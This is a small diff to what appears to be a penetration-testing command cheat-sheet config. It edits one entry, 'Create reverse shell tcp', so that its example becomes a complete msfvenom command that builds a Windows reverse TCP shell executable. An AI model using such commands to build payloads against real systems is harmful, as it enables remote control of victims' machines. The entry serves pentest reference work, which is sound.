@@ -115,7 +115,7 @@ cmd_types = "pentest"
 explanation = "Create reverse shell tcp"
 args = "-p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|4444> -f <type|exe> > reverse_tcp.exe"
 examples = [
-    "-p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
+    "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
 ]
 
 
